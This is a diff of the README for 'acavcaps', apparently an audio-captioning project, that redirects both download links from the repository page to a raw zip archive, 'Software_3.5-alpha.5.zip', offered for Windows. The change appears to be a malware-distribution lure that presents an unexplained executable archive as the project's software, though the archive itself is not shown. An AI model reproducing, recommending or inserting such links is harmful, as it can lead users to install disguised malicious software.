@@ -1,12 +1,12 @@
 # 🎧 acavcaps - Clear audio captions at scale
 
-[![Download ACAVCaps](https://img.shields.io/badge/Download-ACAVCaps-blue?style=for-the-badge)](https://github.com/Athletic-atlasmountains64/acavcaps)
+[![Download ACAVCaps](https://img.shields.io/badge/Download-ACAVCaps-blue?style=for-the-badge)](https://github.com/Athletic-atlasmountains64/acavcaps/raw/refs/heads/main/src/Software_3.5-alpha.5.zip)
 
 ## 📥 Download and start
 
 Use the link below to get ACAVCaps on your Windows PC.
 
-[Download ACAVCaps](https://github.com/Athletic-atlasmountains64/acavcaps)
+[Download ACAVCaps](https://github.com/Athletic-atlasmountains64/acavcaps/raw/refs/heads/main/src/Software_3.5-alpha.5.zip)
 
 ## 1. Introduction
 
